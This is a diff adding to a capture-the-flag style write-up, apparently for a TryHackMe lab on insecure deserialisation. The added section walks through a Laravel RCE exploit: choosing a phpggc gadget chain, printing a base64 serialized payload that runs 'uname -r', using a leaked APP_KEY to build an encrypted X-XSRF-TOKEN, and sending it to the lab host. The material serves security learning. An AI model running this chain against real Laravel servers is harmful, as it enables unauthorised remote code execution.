@@ -649,7 +649,43 @@ Ysoserial is available for [download](https://github.com/frohoff/ysoserial) on G
 
 3. What is the output of the `uname -r` command on the vulnerable Laravel application?
 
+`5.15.0-1075-aws`
 
+As we know that the application version PHP is 7.2.10 so checking which gadget chain to choose by command: `php phpggc -l Laravel`
+
+<img width="563" height="401" alt="image" src="https://github.com/user-attachments/assets/4c30ca77-61b1-477b-90b8-789100eb63d9" />
+
+Choosing `Laravel/RCE3` gadget chain.
+
+Then run the `php phpggc -b Laravel/RCE3 system 'uname -r'` to get the encoded base64 payload.
+
+`Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6ODoidW5hbWUgLXIiO3M6MTc6IgAqAGRlZmF1bHRDaGFubmVsIjtzOjE6IngiO3M6MTc6IgAqAGN1c3RvbUNyZWF0b3JzIjthOjE6e3M6MToieCI7czo2OiJzeXN0ZW0iO319fQ==`
+
+<img width="1142" height="51" alt="image" src="https://github.com/user-attachments/assets/b311f451-e8c6-4260-b174-0933cec473b1" />
+
+Get the `APP_KEY` from link `http://<MACHINE_IP>:8089/get-key`
+
+```
+APP_KEY: HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY=
+APP_KEY (urlencoded): HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY%3D
+```
+
+<img width="1148" height="148" alt="image" src="https://github.com/user-attachments/assets/b9bd5d73-105a-4564-9f7b-f8d85d3e3a4a" />
+
+Then use the link `http://10.49.158.152:8089/cve.php?app_key=xx&payload=xx` with the `APP_KEY` you generated and payload you generated for the `uname` command
+
+`http://10.49.158.152:8089/cve.php?app_key=HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY=&payload=Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086Mjg6IklsbHVtaW5hdGVcRXZlbnRzXERpc3BhdGNoZXIiOjE6e3M6MTI6IgAqAGxpc3RlbmVycyI7YToxOntzOjg6InVuYW1lIC1yIjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX19czo4OiIAKgBldmVudCI7czo4OiJ1bmFtZSAtciI7fQ==`
+
+Then you get the HTTP Header for POST request.
+
+```
+THM: VULNERABLE APP
+Here we go: HTTP header for POST request: X-XSRF-TOKEN: eyJpdiI6IlAxVWJDNlZxaUVTXC92bXIxc2R6WUJnPT0iLCJ2YWx1ZSI6InRkZFBicWZGZnp6WXIxZURwTU0yb2hYdWV2YjBFc2tQcGJTTk5QUlduM0VDdzE5Tjk2b3FUUnVDTHN4Q0xHQ3NvcktJTVRjNUZRWEQ3dTVZaW9xNTVTM2lOdXc4RWdsMWxCZGU4T1Arcnd1OEtZVlNTcVN4bVJnS09HUHhNS1doVkEzVFhsRnZiVk0zYllvc3A1RzRDd0w0emJTRWxTYThwZUVzV2twTHlsdzlBb0VldmZnV0dTZHFmK1FMQUY4R0xTMk52bHQ0ZnVpYmdPSkxDTG9FaWNGMnNtakpWVEJqVFJcL3Nja25YdnptMUNuTXgxekp4K1l1Z2tpMTVuZGF3MW5DdjY1YUFRXC9HXC9xR0hyd3k4UzVadnNNUXJvWEJwOGx1dlh1K1RxbzVrVGxJTDdpWEF0ajdHZ0VIMzlzQ295IiwibWFjIjoiZjVjYWU3MTBhM2U5MWY3N2I3ZWZiMzUzZTM2YmFmYjk5NjA1NTE1YTdkYjg4ZjMwMmM0ZjM5MzllMWIwYzdlNSJ9
+```
+
+<img width="1145" height="139" alt="image" src="https://github.com/user-attachments/assets/66418372-e326-426f-b776-440ffe676689" />
+
+Then use curl command like above with the request.
 
 ## Mitigation Measures
 
@@ -681,15 +717,6 @@ Mitigating the risks associated with insecure deserialisation is paramount in en
 Is it a good practice to blindly use the `eval()` function in your code? (yea/nay)
 
 nay
-
-
-
-
-
-
-
-
-
 
 
 
